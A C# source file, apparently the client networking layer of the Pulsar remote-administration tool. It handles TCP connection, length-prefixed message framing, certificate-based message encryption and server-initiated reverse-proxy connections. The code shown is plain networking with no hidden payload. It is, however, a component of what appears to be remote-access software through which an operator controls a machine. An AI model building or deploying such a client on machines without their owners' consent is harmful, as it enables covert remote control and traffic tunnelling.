using Pulsar.Client.ReverseProxy;
using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Common.Extensions;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.Administration.ReverseProxy;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Buffers;
using System.Buffers.Binary;
using System.Threading.Tasks;

namespace Pulsar.Client.Networking
{
    internal static class CrashLogger
    {
        private static bool _installed;

        public static void Log(string source, Exception ex)
        {
            if (ex == null) return;

            Console.WriteLine($"[CRASH][{DateTime.UtcNow:O}] {source}");
            Console.WriteLine($"Exception: {ex.GetType().Name}: {ex.Message}");
            Console.WriteLine($"Stack Trace: {ex.StackTrace}");
            Console.WriteLine();
        }

        public static void LogMessage(string source, string message)
        {
            if (string.IsNullOrEmpty(message)) return;

            Console.WriteLine($"[INFO][{DateTime.UtcNow:O}] {source}");
            Console.WriteLine($"Message: {message}");
            Console.WriteLine();
        }

        public static void InstallGlobalHandlers()
        {
            if (_installed) return;
            _installed = true;

            try
            {
                AppDomain.CurrentDomain.UnhandledException += (s, e) =>
                {
                    var ex = e.ExceptionObject as Exception ??
                             new Exception(e.ExceptionObject?.ToString() ?? "Unknown unhandled exception");
                    Log("AppDomain.UnhandledException", ex);
                };

                TaskScheduler.UnobservedTaskException += (s, e) =>
                {
                    Log("TaskScheduler.UnobservedTaskException", e.Exception);
                    e.SetObserved();
                };
            }
            catch
            {
                // if this fails, we still don't want to crash
            }
        }
    }
    public class Client : ISender, IDisposable
    {
        private const uint KEEP_ALIVE_TIME_MS = 25000;      // 25s
        private const uint KEEP_ALIVE_INTERVAL_MS = 25000;  // 25s
        private const int HEADER_SIZE_BYTES = 4;            // 4B

        public event ClientFailEventHandler ClientFail;
        public delegate void ClientFailEventHandler(Client s, Exception ex);

        public event ClientStateEventHandler ClientState;
        public delegate void ClientStateEventHandler(Client s, bool connected);

        public event ClientReadEventHandler ClientRead;
        public delegate void ClientReadEventHandler(Client s, IMessage message, int messageLength);

        public bool Connected { get; private set; }

        public ReverseProxyClient[] ProxyClients
        {
            get
            {
                lock (_proxyClientsLock)
                {
                    return _proxyClients.ToArray();
                }
            }
        }

        private Stream _stream;
        private readonly X509Certificate2 _serverCertificate;
        protected bool EncryptTraffic { get; set; }

        private readonly List<ReverseProxyClient> _proxyClients = new List<ReverseProxyClient>();
        private readonly object _readMessageLock = new object();
        private readonly object _sendMessageLock = new object();
        private readonly object _proxyClientsLock = new object();

        private byte[] _readBuffer;
        private int _readOffset;
        private int _readLength;

        private readonly ConcurrentQueue<IMessage> _sendBuffers = new ConcurrentQueue<IMessage>();
        private int _sendingMessagesFlag;

        private volatile bool _disposed;

        public uint KEEP_ALIVE_TIME => KEEP_ALIVE_TIME_MS;
        public uint KEEP_ALIVE_INTERVAL => KEEP_ALIVE_INTERVAL_MS;
        public int HEADER_SIZE => HEADER_SIZE_BYTES;

        protected Client(X509Certificate2 serverCertificate)
        {
            CrashLogger.InstallGlobalHandlers();

            // In DEBUG we allow null; in RELEASE we enforce non-null
            _serverCertificate = serverCertificate;

            _readBuffer = new byte[HEADER_SIZE_BYTES];
            _readOffset = 0;
            _readLength = HEADER_SIZE_BYTES;

#if DEBUG
            bool certUsable = _serverCertificate != null &&
                              SecureMessageEnvelopeHelper.CanUse(_serverCertificate);

            string env = Environment.GetEnvironmentVariable("PULSAR_DEBUG_ENFORCE_ENCRYPTION");
            bool enforce = false;

            if (!string.IsNullOrEmpty(env))
            {
                switch (env.Trim().ToLowerInvariant())
                {
                    case "1":
                    case "true":
                    case "yes":
                    case "enable":
                    case "on":
                        enforce = true;
                        break;
                }
            }

            if (enforce)
            {
                if (!certUsable)
                {
                    EncryptTraffic = false;
                    Debug.WriteLine("[CLIENT][DEBUG] Encryption enforced but certificate is unusable -> running UNENCRYPTED (no crash).");
                    CrashLogger.LogMessage("Client.Ctor", "Encryption enforced but certificate unusable; running unencrypted (DEBUG).");
                }
                else
                {
                    EncryptTraffic = true;
                    Debug.WriteLine("[CLIENT][DEBUG] Encryption enforced via PULSAR_DEBUG_ENFORCE_ENCRYPTION.");
                }
            }
            else
            {
                // Default in DEBUG: no encryption, no requirement for cert
                EncryptTraffic = false;

                if (!certUsable)
                    Debug.WriteLine("[CLIENT][DEBUG] Certificate missing/unusable -> encryption disabled (normal for debug).");
                else
                    Debug.WriteLine("[CLIENT][DEBUG] No enforcement variable -> encryption disabled (default debug).");
            }
#else
            if (_serverCertificate == null)
                throw new ArgumentNullException(nameof(serverCertificate), "Server certificate is required in RELEASE builds.");

            EncryptTraffic = SecureMessageEnvelopeHelper.CanUse(_serverCertificate);
            if (!EncryptTraffic)
                throw new InvalidOperationException("A valid server certificate is required for secure communication.");
#endif
        }

        private void SafeInvoke(MulticastDelegate multi, params object[] args)
        {
            if (multi == null)
                return;

            foreach (Delegate d in multi.GetInvocationList())
            {
                try
                {
                    d.DynamicInvoke(args);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("[EVENT HANDLER ERROR] " + ex);
                    CrashLogger.Log($"Client.SafeInvoke({d.Method.DeclaringType?.FullName}.{d.Method.Name})", ex);
                }
            }
        }

        private void OnClientFail(Exception ex)
        {
            if (ex == null) return;
            Debug.WriteLine("[CLIENT FAIL] " + ex);
            CrashLogger.Log("Client.OnClientFail", ex);
            SafeInvoke(ClientFail, this, ex);
        }

        private void OnClientState(bool connected)
        {
            if (Connected == connected)
                return;

            Connected = connected;
            CrashLogger.LogMessage("Client.OnClientState", $"Connected={connected}");
            SafeInvoke(ClientState, this, connected);
        }

        private void OnClientRead(IMessage message, int messageLength)
        {
            if (message == null)
                return;

            Debug.WriteLine($"[CLIENT] Received packet: {message.GetType().Name} (Length: {messageLength} bytes)");
            SafeInvoke(ClientRead, this, message, messageLength);
        }

        protected void Connect(IPAddress ip, ushort port)
        {
            if (_disposed)
                throw new ObjectDisposedException(nameof(Client));

            Socket handle = null;
            try
            {
                Disconnect();

                handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
                {
                    NoDelay = true
                };
                handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL_MS, KEEP_ALIVE_TIME_MS);
                handle.Connect(ip, port);

                if (handle.Connected)
                {
                    _stream = new NetworkStream(handle, ownsSocket: true);
                    _readBuffer = new byte[HEADER_SIZE_BYTES];
                    _readOffset = 0;
                    _readLength = HEADER_SIZE_BYTES;
                    _stream.BeginRead(_readBuffer, _readOffset, _readLength, AsyncReceive, null);
                    OnClientState(true);
                }
                else
                {
                    handle.Dispose();
                }
            }
            catch (Exception ex)
            {
                CrashLogger.Log("Client.Connect", ex);
                handle?.Dispose();
                Disconnect();
                OnClientFail(ex);
            }
        }

        private void AsyncReceive(IAsyncResult result)
        {
            if (_disposed)
                return;

            try
            {
                if (_stream == null)
                    return;

                int bytesRead = _stream.EndRead(result);
                if (bytesRead <= 0)
                    throw new IOException("Remote closed the connection.");

                byte[] messageBuffer = null;
                int messageLength = 0;

                lock (_readMessageLock)
                {
                    _readOffset += bytesRead;
                    _readLength -= bytesRead;

                    if (_readLength == 0)
                    {
                        if (_readBuffer.Length == HEADER_SIZE_BYTES)
                        {
                            int length = BitConverter.ToInt32(_readBuffer, 0);
                            if (length <= 0)
                                throw new InvalidDataException("Invalid message length.");

                            _readBuffer = new byte[length];
                            _readOffset = 0;
                            _readLength = length;
                        }
                        else
                        {
                            messageBuffer = _readBuffer;
                            messageLength = _readBuffer.Length;

                            _readBuffer = new byte[HEADER_SIZE_BYTES];
                            _readOffset = 0;
                            _readLength = HEADER_SIZE_BYTES;
                        }
                    }
                }

                if (messageBuffer != null)
                {
                    ThreadPool.QueueUserWorkItem(_ =>
                    {
                        try
                        {
                            var message = PulsarMessagePackSerializer.Deserialize(messageBuffer);
                            message = ProcessIncomingMessage(message);
                            OnClientRead(message, messageLength);
                        }
                        catch (Exception ex)
                        {
                            CrashLogger.Log("Client.AsyncReceive.Worker", ex);
                            Disconnect();
                            OnClientFail(ex);
                        }
                    });
                }

                if (_stream != null && !_disposed)
                {
                    try
                    {
                        _stream.BeginRead(_readBuffer, _readOffset, _readLength, AsyncReceive, null);
                    }
                    catch (Exception ex)
                    {
                        CrashLogger.Log("Client.AsyncReceive.BeginRead", ex);
                        Disconnect();
                        OnClientFail(ex);
                    }
                }
            }
            catch (Exception ex)
            {
                CrashLogger.Log("Client.AsyncReceive", ex);
                Disconnect();
                OnClientFail(ex);
            }
        }

        public void Send<T>(T message) where T : IMessage
        {
            if (!Connected || _disposed || message == null)
                return;

            _sendBuffers.Enqueue(message);
            if (Interlocked.Exchange(ref _sendingMessagesFlag, 1) == 0)
            {
                ThreadPool.QueueUserWorkItem(ProcessSendBuffers);
            }
        }

        private void ProcessSendBuffers(object state)
        {
            while (true)
            {
                if (!Connected || _disposed)
                {
                    SendCleanup(true);
                    return;
                }

                if (!_sendBuffers.TryDequeue(out var message))
                {
                    SendCleanup();
                    return;
                }

                SafeSendMessage(message);
            }
        }

        private void SendCleanup(bool clear = false)
        {
            Interlocked.Exchange(ref _sendingMessagesFlag, 0);
            if (clear)
            {
                while (_sendBuffers.TryDequeue(out _)) { }
            }
        }

        private IMessage PrepareMessageForSend(IMessage message)
        {
            if (message == null)
                return null;

            if (message is SecureMessageEnvelope)
                return message;

            if (!EncryptTraffic)
                return message;

            if (!SecureMessageEnvelopeHelper.CanUse(_serverCertificate))
                throw new InvalidOperationException("Secure transport is enabled but no certificate is available.");

            return SecureMessageEnvelopeHelper.Wrap(message, _serverCertificate);
        }

        private IMessage ProcessIncomingMessage(IMessage message)
        {
            if (message is SecureMessageEnvelope secureEnvelope)
            {
                if (!SecureMessageEnvelopeHelper.CanUse(_serverCertificate))
                    throw new InvalidOperationException("Received a secure envelope but no certificate is available for decryption.");

                return SecureMessageEnvelopeHelper.Unwrap(secureEnvelope, _serverCertificate);
            }

            if (EncryptTraffic)
                throw new InvalidOperationException($"Received unexpected plaintext message of type {message?.GetType().Name} while encryption is enforced.");

            return message;
        }

        public void SendBlocking<T>(T message) where T : IMessage
        {
            if (!Connected || _disposed || message == null)
                return;

            SafeSendMessage(message);
        }

        private void SafeSendMessage(IMessage message)
        {
            if (_disposed)
                return;

            byte[] payload;
            IMessage prepared;

            try
            {
                prepared = PrepareMessageForSend(message);
                if (prepared == null)
                    return;

                payload = PulsarMessagePackSerializer.Serialize(prepared);
            }
            catch (Exception ex)
            {
                CrashLogger.Log("Client.SafeSendMessage.PrepareOrSerialize", ex);
                Disconnect();
                OnClientFail(ex);
                return;
            }

            int totalLength = HEADER_SIZE_BYTES + payload.Length;
            byte[] buffer = ArrayPool<byte>.Shared.Rent(totalLength);

            try
            {
                BinaryPrimitives.WriteInt32LittleEndian(new Span<byte>(buffer, 0, HEADER_SIZE_BYTES), payload.Length);
                Buffer.BlockCopy(payload, 0, buffer, HEADER_SIZE_BYTES, payload.Length);

                lock (_sendMessageLock)
                {
                    if (_stream == null || _disposed)
                        return;

                    _stream.Write(buffer, 0, totalLength);
                }
            }
            catch (Exception ex)
            {
                CrashLogger.Log("Client.SafeSendMessage.Write", ex);
                Disconnect();
                OnClientFail(ex);
            }
            finally
            {
                ArrayPool<byte>.Shared.Return(buffer, clearArray: false);
            }
        }

        public void Disconnect()
        {
            if (_disposed)
                return;

            lock (_sendMessageLock)
            {
                if (_stream != null)
                {
                    try
                    {
                        _stream.Dispose();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine("[CLIENT] Stream dispose error: " + ex);
                        CrashLogger.Log("Client.Disconnect.StreamDispose", ex);
                    }
                    _stream = null;
                }
            }

            _readBuffer = new byte[HEADER_SIZE_BYTES];
            _readOffset = 0;
            _readLength = HEADER_SIZE_BYTES;

            lock (_proxyClientsLock)
            {
                foreach (var proxy in _proxyClients)
                {
                    try
                    {
                        proxy.Disconnect();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"[CLIENT] Proxy disconnect error: {ex.Message}");
                        CrashLogger.Log("Client.Disconnect.ProxyDisconnect", ex);
                    }
                }
                _proxyClients.Clear();
            }

            SendCleanup(true);
            OnClientState(false);
        }

        public void ConnectReverseProxy(ReverseProxyConnect command)
        {
            if (command == null)
                throw new ArgumentNullException(nameof(command));

            var proxy = new ReverseProxyClient(command, this);
            lock (_proxyClientsLock)
            {
                _proxyClients.Add(proxy);
            }
        }

        public ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
        {
            lock (_proxyClientsLock)
            {
                return _proxyClients.FirstOrDefault(proxy => proxy.ConnectionId == connectionId);
            }
        }

        public void RemoveProxyClient(int connectionId)
        {
            lock (_proxyClientsLock)
            {
                _proxyClients.RemoveAll(proxy => proxy.ConnectionId == connectionId);
            }
        }

        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
                return;

            if (disposing)
            {
                try
                {
                    Disconnect();
                }
                catch (Exception ex)
                {
                    CrashLogger.Log("Client.Dispose.Disconnect", ex);
                }
            }

            _disposed = true;
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
    }
}
